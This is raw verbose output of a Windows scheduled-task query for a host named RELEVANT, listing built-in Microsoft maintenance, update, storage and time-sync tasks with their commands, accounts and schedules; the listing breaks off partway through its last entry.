TaskName:                             \Microsoft\Windows\Plug and Play\Device Install Reboot Required
Next Run Time:                        N/A
Status:                               Ready
Logon Mode:                           Interactive/Background
Last Run Time:                        11/30/1999 12:00:00 AM
Last Result:                          267011
Author:                               Microsoft Corporation
Task To Run:                          COM handler
Start In:                             N/A
Comment:                              Displays a dialog box that asks the user to restart Windows if it is required to complete installation of a device
Scheduled Task State:                 Enabled
Idle Time:                            Disabled
Power Management:                     
Run As User:                          INTERACTIVE
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 72:00:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        Undefined
Start Time:                           N/A
Start Date:                           N/A
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        N/A
Repeat: Until: Time:                  N/A
Repeat: Until: Duration:              N/A
Repeat: Stop If Still Running:        N/A

HostName:                             RELEVANT
TaskName:                             \Microsoft\Windows\Plug and Play\Plug and Play Cleanup
Next Run Time:                        N/A
Status:                               Ready
Logon Mode:                           Interactive/Background
Last Run Time:                        7/19/2021 6:25:48 AM
Last Result:                          0
Author:                               Microsoft Corporation
Task To Run:                          COM handler
Start In:                             N/A
Comment:                              Windows keeps copies of all previously installed device driver packages from Windows Update and other sources, even after installing newer versions of drivers. This task will remove older versions of drivers that are no longer needed. The most current v
Scheduled Task State:                 Enabled
Idle Time:                            Only Start If Idle for  minutes, If Not Idle Retry For  minutes Stop the task if Idle State end
Power Management:                     Stop On Battery Mode, No Start On Batteries
Run As User:                          SYSTEM
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 01:00:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        On demand only
Start Time:                           N/A
Start Date:                           N/A
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        N/A
Repeat: Until: Time:                  N/A
Repeat: Until: Duration:              N/A
Repeat: Stop If Still Running:        N/A

HostName:                             RELEVANT
TaskName:                             \Microsoft\Windows\Plug and Play\Sysprep Generalize Drivers
Next Run Time:                        N/A
Status:                               Ready
Logon Mode:                           Interactive/Background
Last Run Time:                        11/30/1999 12:00:00 AM
Last Result:                          267011
Author:                               Microsoft Corporation
Task To Run:                          %SystemRoot%\System32\drvinst.exe 6
Start In:                             N/A
Comment:                              Generalize driver state in order to prepare the system to be bootable on any hardware configuration.
Scheduled Task State:                 Enabled
Idle Time:                            Disabled
Power Management:                     
Run As User:                          SYSTEM
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 72:00:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        On demand only
Start Time:                           N/A
Start Date:                           N/A
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        N/A
Repeat: Until: Time:                  N/A
Repeat: Until: Duration:              N/A
Repeat: Stop If Still Running:        N/A

Folder: \Microsoft\Windows\Power Efficiency Diagnostics
HostName:                             RELEVANT
TaskName:                             \Microsoft\Windows\Power Efficiency Diagnostics\AnalyzeSystem
Next Run Time:                        N/A
Status:                               Queued
Logon Mode:                           Interactive/Background
Last Run Time:                        7/19/2021 6:25:50 AM
Last Result:                          0
Author:                               Microsoft Corporation
Task To Run:                          COM handler
Start In:                             N/A
Comment:                              This task analyzes the system looking for conditions that may cause high energy use.
Scheduled Task State:                 Enabled
Idle Time:                            Disabled
Power Management:                     
Run As User:                          SYSTEM
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 00:05:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        On demand only
Start Time:                           N/A
Start Date:                           N/A
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        N/A
Repeat: Until: Time:                  N/A
Repeat: Until: Duration:              N/A
Repeat: Stop If Still Running:        N/A

Folder: \Microsoft\Windows\RecoveryEnvironment
HostName:                             RELEVANT
TaskName:                             \Microsoft\Windows\RecoveryEnvironment\VerifyWinRE
Next Run Time:                        N/A
Status:                               Ready
Logon Mode:                           Interactive/Background
Last Run Time:                        11/30/1999 12:00:00 AM
Last Result:                          267011
Author:                               Microsoft Corporation
Task To Run:                          COM handler
Start In:                             N/A
Comment:                              Validates the Windows Recovery Environment.
Scheduled Task State:                 Enabled
Idle Time:                            Only Start If Idle for  minutes, If Not Idle Retry For  minutes
Power Management:                     No Start On Batteries
Run As User:                          Administrators
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 01:00:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        On demand only
Start Time:                           N/A
Start Date:                           N/A
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        N/A
Repeat: Until: Time:                  N/A
Repeat: Until: Duration:              N/A
Repeat: Stop If Still Running:        N/A

Folder: \Microsoft\Windows\Server Manager
HostName:                             RELEVANT
TaskName:                             \Microsoft\Windows\Server Manager\CleanupOldPerfLogs
Next Run Time:                        N/A
Status:                               Ready
Logon Mode:                           Interactive/Background
Last Run Time:                        11/30/1999 12:00:00 AM
Last Result:                          267011
Author:                               The major version number of the operating system.
Task To Run:                          %systemroot%\system32\cscript.exe /B /nologo %systemroot%\system32\calluxxprovider.vbs $(Arg0) $(Arg1) $(Arg2)
Start In:                             N/A
Comment:                              N/A
Scheduled Task State:                 Enabled
Idle Time:                            Disabled
Power Management:                     Stop On Battery Mode, No Start On Batteries
Run As User:                          SYSTEM
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 00:02:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        On demand only
Start Time:                           N/A
Start Date:                           N/A
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        N/A
Repeat: Until: Time:                  N/A
Repeat: Until: Duration:              N/A
Repeat: Stop If Still Running:        N/A

HostName:                             RELEVANT
TaskName:                             \Microsoft\Windows\Server Manager\ServerManager
Next Run Time:                        N/A
Status:                               Ready
Logon Mode:                           Interactive/Background
Last Run Time:                        7/25/2020 2:42:16 PM
Last Result:                          0
Author:                               Microsoft Corporation
Task To Run:                          %windir%\system32\ServerManagerLauncher.exe 
Start In:                             N/A
Comment:                              Task for launching Initial Configuration Tasks or Server Manager at logon.
Scheduled Task State:                 Enabled
Idle Time:                            Disabled
Power Management:                     Stop On Battery Mode
Run As User:                          Administrators
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: Disabled
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        At logon time
Start Time:                           N/A
Start Date:                           N/A
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        N/A
Repeat: Until: Time:                  N/A
Repeat: Until: Duration:              N/A
Repeat: Stop If Still Running:        N/A

Folder: \Microsoft\Windows\Servicing
HostName:                             RELEVANT
TaskName:                             \Microsoft\Windows\Servicing\StartComponentCleanup
Next Run Time:                        N/A
Status:                               Ready
Logon Mode:                           Interactive/Background
Last Run Time:                        7/19/2021 6:25:48 AM
Last Result:                          0
Author:                               N/A
Task To Run:                          COM handler
Start In:                             N/A
Comment:                              N/A
Scheduled Task State:                 Enabled
Idle Time:                            Disabled
Power Management:                     Stop On Battery Mode, No Start On Batteries
Run As User:                          SYSTEM
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 01:00:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        On demand only
Start Time:                           N/A
Start Date:                           N/A
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        N/A
Repeat: Until: Time:                  N/A
Repeat: Until: Duration:              N/A
Repeat: Stop If Still Running:        N/A

Folder: \Microsoft\Windows\SettingSync
HostName:                             RELEVANT
TaskName:                             \Microsoft\Windows\SettingSync\BackgroundUploadTask
Next Run Time:                        N/A
Status:                               Ready
Logon Mode:                           Interactive/Background
Last Run Time:                        11/30/1999 12:00:00 AM
Last Result:                          267011
Author:                               N/A
Task To Run:                          COM handler
Start In:                             N/A
Comment:                              N/A
Scheduled Task State:                 Enabled
Idle Time:                            Only Start If Idle for  minutes, If Not Idle Retry For 180 minutes Stop the task if Idle State end
Power Management:                     
Run As User:                          INTERACTIVE
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 72:00:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        On demand only
Start Time:                           N/A
Start Date:                           N/A
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        N/A
Repeat: Until: Time:                  N/A
Repeat: Until: Duration:              N/A
Repeat: Stop If Still Running:        N/A

HostName:                             RELEVANT
TaskName:                             \Microsoft\Windows\SettingSync\BackupTask
Next Run Time:                        N/A
Status:                               Ready
Logon Mode:                           Interactive/Background
Last Run Time:                        11/30/1999 12:00:00 AM
Last Result:                          267011
Author:                               N/A
Task To Run:                          COM handler
Start In:                             N/A
Comment:                              N/A
Scheduled Task State:                 Enabled
Idle Time:                            Only Start If Idle for  minutes, If Not Idle Retry For 180 minutes Stop the task if Idle State end
Power Management:                     
Run As User:                          INTERACTIVE
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 72:00:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        On demand only
Start Time:                           N/A
Start Date:                           N/A
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        N/A
Repeat: Until: Time:                  N/A
Repeat: Until: Duration:              N/A
Repeat: Stop If Still Running:        N/A

HostName:                             RELEVANT
TaskName:                             \Microsoft\Windows\SettingSync\NetworkStateChangeTask
Next Run Time:                        N/A
Status:                               Ready
Logon Mode:                           Interactive/Background
Last Run Time:                        11/30/1999 12:00:00 AM
Last Result:                          267011
Author:                               N/A
Task To Run:                          COM handler
Start In:                             N/A
Comment:                              N/A
Scheduled Task State:                 Enabled
Idle Time:                            Disabled
Power Management:                     
Run As User:                          INTERACTIVE
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: Disabled
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        Undefined
Start Time:                           N/A
Start Date:                           N/A
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        N/A
Repeat: Until: Time:                  N/A
Repeat: Until: Duration:              N/A
Repeat: Stop If Still Running:        N/A

HostName:                             RELEVANT
TaskName:                             \Microsoft\Windows\SettingSync\NetworkStateChangeTask
Next Run Time:                        N/A
Status:                               Ready
Logon Mode:                           Interactive/Background
Last Run Time:                        11/30/1999 12:00:00 AM
Last Result:                          267011
Author:                               N/A
Task To Run:                          COM handler
Start In:                             N/A
Comment:                              N/A
Scheduled Task State:                 Enabled
Idle Time:                            Disabled
Power Management:                     
Run As User:                          INTERACTIVE
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: Disabled
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        Undefined
Start Time:                           N/A
Start Date:                           N/A
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        N/A
Repeat: Until: Time:                  N/A
Repeat: Until: Duration:              N/A
Repeat: Stop If Still Running:        N/A

Folder: \Microsoft\Windows\Shell
HostName:                             RELEVANT
TaskName:                             \Microsoft\Windows\Shell\CreateObjectTask
Next Run Time:                        N/A
Status:                               Ready
Logon Mode:                           Interactive/Background
Last Run Time:                        7/25/2020 9:48:54 AM
Last Result:                          0
Author:                               Microsoft Corporation
Task To Run:                          COM handler
Start In:                             N/A
Comment:                              Provides support for shell components that access system data
Scheduled Task State:                 Enabled
Idle Time:                            Disabled
Power Management:                     
Run As User:                          SYSTEM
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 00:00:30
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        On demand only
Start Time:                           N/A
Start Date:                           N/A
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        N/A
Repeat: Until: Time:                  N/A
Repeat: Until: Duration:              N/A
Repeat: Stop If Still Running:        N/A

HostName:                             RELEVANT
TaskName:                             \Microsoft\Windows\Shell\IndexerAutomaticMaintenance
Next Run Time:                        N/A
Status:                               Ready
Logon Mode:                           Interactive/Background
Last Run Time:                        7/19/2021 6:25:50 AM
Last Result:                          1
Author:                               Microsoft Corporation
Task To Run:                          COM handler
Start In:                             N/A
Comment:                              Keeps the search index up to date
Scheduled Task State:                 Enabled
Idle Time:                            Disabled
Power Management:                     Stop On Battery Mode, No Start On Batteries
Run As User:                          LOCAL SERVICE
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 72:00:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        On demand only
Start Time:                           N/A
Start Date:                           N/A
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        N/A
Repeat: Until: Time:                  N/A
Repeat: Until: Duration:              N/A
Repeat: Stop If Still Running:        N/A

Folder: \Microsoft\Windows\Software Inventory Logging
HostName:                             RELEVANT
TaskName:                             \Microsoft\Windows\Software Inventory Logging\Collection
Next Run Time:                        N/A
Status:                               Disabled
Logon Mode:                           Interactive/Background
Last Run Time:                        11/30/1999 12:00:00 AM
Last Result:                          267011
Author:                               N/A
Task To Run:                          %systemroot%\system32\cmd.exe /d /c %systemroot%\system32\silcollector.cmd publish
Start In:                             N/A
Comment:                              N/A
Scheduled Task State:                 Disabled
Idle Time:                            Disabled
Power Management:                     Stop On Battery Mode, No Start On Batteries
Run As User:                          SYSTEM
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 00:10:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        One Time Only, Hourly 
Start Time:                           3:00:00 AM
Start Date:                           1/1/2000
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        1 Hour(s), 0 Minute(s)
Repeat: Until: Time:                  None
Repeat: Until: Duration:              Disabled
Repeat: Stop If Still Running:        Disabled

HostName:                             RELEVANT
TaskName:                             \Microsoft\Windows\Software Inventory Logging\Configuration
Next Run Time:                        N/A
Status:                               Ready
Logon Mode:                           Interactive/Background
Last Run Time:                        7/19/2021 6:15:03 AM
Last Result:                          0
Author:                               N/A
Task To Run:                          %systemroot%\system32\cmd.exe /d /c %systemroot%\system32\silcollector.cmd configure
Start In:                             N/A
Comment:                              N/A
Scheduled Task State:                 Enabled
Idle Time:                            Disabled
Power Management:                     Stop On Battery Mode, No Start On Batteries
Run As User:                          SYSTEM
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 00:02:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        At system start up
Start Time:                           N/A
Start Date:                           N/A
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        N/A
Repeat: Until: Time:                  N/A
Repeat: Until: Duration:              N/A
Repeat: Stop If Still Running:        N/A

Folder: \Microsoft\Windows\SpacePort
HostName:                             RELEVANT
TaskName:                             \Microsoft\Windows\SpacePort\SpaceAgentTask
Next Run Time:                        N/A
Status:                               Ready
Logon Mode:                           Interactive/Background
Last Run Time:                        11/30/1999 12:00:00 AM
Last Result:                          267011
Author:                               Microsoft Corporation
Task To Run:                          %windir%\system32\SpaceAgent.exe 
Start In:                             N/A
Comment:                              Storage Spaces Settings
Scheduled Task State:                 Enabled
Idle Time:                            Disabled
Power Management:                     
Run As User:                          SYSTEM
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 06:00:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        At system start up
Start Time:                           N/A
Start Date:                           N/A
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        N/A
Repeat: Until: Time:                  N/A
Repeat: Until: Duration:              N/A
Repeat: Stop If Still Running:        N/A

HostName:                             RELEVANT
TaskName:                             \Microsoft\Windows\SpacePort\SpaceAgentTask
Next Run Time:                        N/A
Status:                               Ready
Logon Mode:                           Interactive/Background
Last Run Time:                        11/30/1999 12:00:00 AM
Last Result:                          267011
Author:                               Microsoft Corporation
Task To Run:                          %windir%\system32\SpaceAgent.exe 
Start In:                             N/A
Comment:                              Storage Spaces Settings
Scheduled Task State:                 Enabled
Idle Time:                            Disabled
Power Management:                     
Run As User:                          SYSTEM
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 06:00:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        Undefined
Start Time:                           N/A
Start Date:                           N/A
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        N/A
Repeat: Until: Time:                  N/A
Repeat: Until: Duration:              N/A
Repeat: Stop If Still Running:        N/A

HostName:                             RELEVANT
TaskName:                             \Microsoft\Windows\SpacePort\SpaceManagerTask
Next Run Time:                        N/A
Status:                               Ready
Logon Mode:                           Interactive/Background
Last Run Time:                        11/30/1999 12:00:00 AM
Last Result:                          267011
Author:                               $(@%SystemRoot%\system32\spaceman.exe,-2)
Task To Run:                          %windir%\system32\spaceman.exe /Work
Start In:                             N/A
Comment:                              $(@%SystemRoot%\system32\spaceman.exe,-3)
Scheduled Task State:                 Enabled
Idle Time:                            Disabled
Power Management:                     
Run As User:                          SYSTEM
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: Disabled
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        At system start up
Start Time:                           N/A
Start Date:                           N/A
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        N/A
Repeat: Until: Time:                  N/A
Repeat: Until: Duration:              N/A
Repeat: Stop If Still Running:        N/A

HostName:                             RELEVANT
TaskName:                             \Microsoft\Windows\SpacePort\SpaceManagerTask
Next Run Time:                        N/A
Status:                               Ready
Logon Mode:                           Interactive/Background
Last Run Time:                        11/30/1999 12:00:00 AM
Last Result:                          267011
Author:                               $(@%SystemRoot%\system32\spaceman.exe,-2)
Task To Run:                          %windir%\system32\spaceman.exe /Work
Start In:                             N/A
Comment:                              $(@%SystemRoot%\system32\spaceman.exe,-3)
Scheduled Task State:                 Enabled
Idle Time:                            Disabled
Power Management:                     
Run As User:                          SYSTEM
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: Disabled
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        Undefined
Start Time:                           N/A
Start Date:                           N/A
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        N/A
Repeat: Until: Time:                  N/A
Repeat: Until: Duration:              N/A
Repeat: Stop If Still Running:        N/A

Folder: \Microsoft\Windows\Storage Tiers Management
HostName:                             RELEVANT
TaskName:                             \Microsoft\Windows\Storage Tiers Management\Storage Tiers Management Initialization
Next Run Time:                        N/A
Status:                               Ready
Logon Mode:                           Interactive/Background
Last Run Time:                        11/30/1999 12:00:00 AM
Last Result:                          267011
Author:                               Microsoft Corporation
Task To Run:                          COM handler
Start In:                             N/A
Comment:                              Initializes the Storage Tiers Management service when the first tiered storage space is detected on the system. Do not remove or modify this task.
Scheduled Task State:                 Enabled
Idle Time:                            Disabled
Power Management:                     Stop On Battery Mode, No Start On Batteries
Run As User:                          SYSTEM
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: Disabled
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        Undefined
Start Time:                           N/A
Start Date:                           N/A
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        N/A
Repeat: Until: Time:                  N/A
Repeat: Until: Duration:              N/A
Repeat: Stop If Still Running:        N/A

HostName:                             RELEVANT
TaskName:                             \Microsoft\Windows\Storage Tiers Management\Storage Tiers Optimization
Next Run Time:                        N/A
Status:                               Disabled
Logon Mode:                           Interactive/Background
Last Run Time:                        11/30/1999 12:00:00 AM
Last Result:                          267011
Author:                               Microsoft Corporation
Task To Run:                          %windir%\system32\defrag.exe -c -h -g -# -m 8 -i 13500
Start In:                             N/A
Comment:                              Optimizes the placement of data in storage tiers on all tiered storage spaces in the system.
Scheduled Task State:                 Disabled
Idle Time:                            Disabled
Power Management:                     Stop On Battery Mode, No Start On Batteries
Run As User:                          SYSTEM
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 72:00:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        One Time Only, Hourly 
Start Time:                           1:00:00 AM
Start Date:                           1/1/2013
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        4 Hour(s), 0 Minute(s)
Repeat: Until: Time:                  None
Repeat: Until: Duration:              Disabled
Repeat: Stop If Still Running:        Disabled

Folder: \Microsoft\Windows\TextServicesFramework
HostName:                             RELEVANT
TaskName:                             \Microsoft\Windows\TextServicesFramework\MsCtfMonitor
Next Run Time:                        N/A
Status:                               Ready
Logon Mode:                           Interactive/Background
Last Run Time:                        7/25/2020 2:42:15 PM
Last Result:                          1073807364
Author:                               N/A
Task To Run:                          COM handler
Start In:                             N/A
Comment:                              TextServicesFramework monitor task
Scheduled Task State:                 Enabled
Idle Time:                            Disabled
Power Management:                     
Run As User:                          Users
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: Disabled
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        At logon time
Start Time:                           N/A
Start Date:                           N/A
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        N/A
Repeat: Until: Time:                  N/A
Repeat: Until: Duration:              N/A
Repeat: Stop If Still Running:        N/A

Folder: \Microsoft\Windows\Time Synchronization
HostName:                             RELEVANT
TaskName:                             \Microsoft\Windows\Time Synchronization\ForceSynchronizeTime
Next Run Time:                        N/A
Status:                               Ready
Logon Mode:                           Interactive/Background
Last Run Time:                        11/30/1999 12:00:00 AM
Last Result:                          267011
Author:                               Microsoft Corporation
Task To Run:                          COM handler
Start In:                             N/A
Comment:                              This task performs time synchronization.
Scheduled Task State:                 Enabled
Idle Time:                            Disabled
Power Management:                     
Run As User:                          LOCAL SERVICE
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 72:00:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        Undefined
Start Time:                           N/A
Start Date:                           N/A
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        N/A
Repeat: Until: Time:                  N/A
Repeat: Until: Duration:              N/A
Repeat: Stop If Still Running:        N/A

Folder: \Microsoft\Windows\Time Zone
HostName:                             RELEVANT
TaskName:                             \Microsoft\Windows\Time Zone\SynchronizeTimeZone
Next Run Time:                        N/A
Status:                               Ready
Logon Mode:                           Interactive/Background
Last Run Time:                        7/19/2021 6:25:49 AM
Last Result:                          0
Author:                               Microsoft Corporation
Task To Run:                          %windir%\system32\tzsync.exe 
Start In:                             N/A
Comment:                              Updates timezone information. If this task is stopped, local time may not be accurate for some time zones.
Scheduled Task State:                 Enabled
Idle Time:                            Disabled
Power Management:                     Stop On Battery Mode
Run As User:                          SYSTEM
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 01:00:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        On demand only
Start Time:                           N/A
Start Date:                           N/A
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        N/A
Repeat: Until: Time:                  N/A
Repeat: Until: Duration:              N/A
Repeat: Stop If Still Running:        N/A

Folder: \Microsoft\Windows\UpdateOrchestrator
HostName:                             RELEVANT
TaskName:                             \Microsoft\Windows\UpdateOrchestrator\Maintenance Install
Next Run Time:                        N/A
Status:                               Disabled
Logon Mode:                           Interactive/Background
Last Run Time:                        11/30/1999 12:00:00 AM
Last Result:                          267011
Author:                               N/A
Task To Run:                          %systemroot%\system32\usoclient.exe StartInstall
Start In:                             N/A
Comment:                              N/A
Scheduled Task State:                 Disabled
Idle Time:                            Disabled
Power Management:                     
Run As User:                          SYSTEM
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 72:00:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        On demand only
Start Time:                           N/A
Start Date:                           N/A
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        N/A
Repeat: Until: Time:                  N/A
Repeat: Until: Duration:              N/A
Repeat: Stop If Still Running:        N/A

HostName:                             RELEVANT
TaskName:                             \Microsoft\Windows\UpdateOrchestrator\Policy Install
Next Run Time:                        N/A
Status:                               Disabled
Logon Mode:                           Interactive/Background
Last Run Time:                        11/30/1999 12:00:00 AM
Last Result:                          267011
Author:                               N/A
Task To Run:                          %systemroot%\system32\usoclient.exe StartInstall
Start In:                             N/A
Comment:                              N/A
Scheduled Task State:                 Disabled
Idle Time:                            Disabled
Power Management:                     
Run As User:                          SYSTEM
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 72:00:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        One Time Only
Start Time:                           N/A
Start Date:                           N/A
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        Disabled
Repeat: Until: Time:                  Disabled
Repeat: Until: Duration:              Disabled
Repeat: Stop If Still Running:        Disabled

HostName:                             RELEVANT
TaskName:                             \Microsoft\Windows\UpdateOrchestrator\Reboot
Next Run Time:                        N/A
Status:                               Ready
Logon Mode:                           Interactive/Background
Last Run Time:                        11/30/1999 12:00:00 AM
Last Result:                          267011
Author:                               Microsoft Corporation
Task To Run:                          %systemroot%\system32\MusNotification.exe 
Start In:                             N/A
Comment:                              This task triggers a system reboot following update installation.
Scheduled Task State:                 Enabled
Idle Time:                            Disabled
Power Management:                     
Run As User:                          SYSTEM
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 72:00:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        One Time Only
Start Time:                           3:00:00 AM
Start Date:                           1/1/2000
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        Disabled
Repeat: Until: Time:                  Disabled
Repeat: Until: Duration:              Disabled
Repeat: Stop If Still Running:        Disabled

HostName:                             RELEVANT
TaskName:                             \Microsoft\Windows\UpdateOrchestrator\Refresh Settings
Next Run Time:                        7/19/2021 3:25:33 PM
Status:                               Ready
Logon Mode:                           Interactive/Background
Last Run Time:                        7/19/2021 6:25:46 AM
Last Result:                          0
Author:                               Microsoft Corporation
Task To Run:                          %systemroot%\system32\usoclient.exe RefreshSettings
Start In:                             N/A
Comment:                              This task downloads settings for Windows Updates.
Scheduled Task State:                 Enabled
Idle Time:                            Only Start If Idle for  minutes, If Not Idle Retry For  minutes
Power Management:                     No Start On Batteries
Run As User:                          SYSTEM
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 72:00:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        One Time Only, Hourly 
Start Time:                           3:00:00 AM
Start Date:                           1/1/2000
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        22 Hour(s), 0 Minute(s)
Repeat: Until: Time:                  None
Repeat: Until: Duration:              Disabled
Repeat: Stop If Still Running:        Disabled

HostName:                             RELEVANT
TaskName:                             \Microsoft\Windows\UpdateOrchestrator\Resume On Boot
Next Run Time:                        N/A
Status:                               Disabled
Logon Mode:                           Interactive/Background
Last Run Time:                        11/30/1999 12:00:00 AM
Last Result:                          267011
Author:                               N/A
Task To Run:                          %systemroot%\system32\usoclient.exe ResumeUpdate
Start In:                             N/A
Comment:                              N/A
Scheduled Task State:                 Disabled
Idle Time:                            Disabled
Power Management:                     
Run As User:                          SYSTEM
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 72:00:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        At system start up
Start Time:                           N/A
Start Date:                           N/A
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        N/A
Repeat: Until: Time:                  N/A
Repeat: Until: Duration:              N/A
Repeat: Stop If Still Running:        N/A

HostName:                             RELEVANT
TaskName:                             \Microsoft\Windows\UpdateOrchestrator\Schedule Retry Scan
Next Run Time:                        N/A
Status:                               Ready
Logon Mode:                           Interactive/Background
Last Run Time:                        11/30/1999 12:00:00 AM
Last Result:                          267011
Author:                               N/A
Task To Run:                          %systemroot%\system32\usoclient.exe StartScan
Start In:                             N/A
Comment:                              N/A
Scheduled Task State:                 Enabled
Idle Time:                            Disabled
Power Management:                     
Run As User:                          INTERACTIVE
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 72:00:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        At logon time
Start Time:                           N/A
Start Date:                           N/A
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        N/A
Repeat: Until: Time:                  N/A
Repeat: Until: Duration:              N/A
Repeat: Stop If Still Running:        N/A

HostName:                             RELEVANT
TaskName:                             \Microsoft\Windows\UpdateOrchestrator\Schedule Scan
Next Run Time:                        7/20/2021 6:03:06 AM
Status:                               Ready
Logon Mode:                           Interactive/Background
Last Run Time:                        7/19/2021 6:16:59 AM
Last Result:                          0
Author:                               Microsoft Corporation
Task To Run:                          %systemroot%\system32\usoclient.exe StartScan
Start In:                             N/A
Comment:                              This task performs a scheduled Windows Update scan.
Scheduled Task State:                 Enabled
Idle Time:                            Disabled
Power Management:                     
Run As User:                          SYSTEM
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 72:00:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        One Time Only, Hourly 
Start Time:                           N/A
Start Date:                           N/A
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        22 Hour(s), 0 Minute(s)
Repeat: Until: Time:                  None
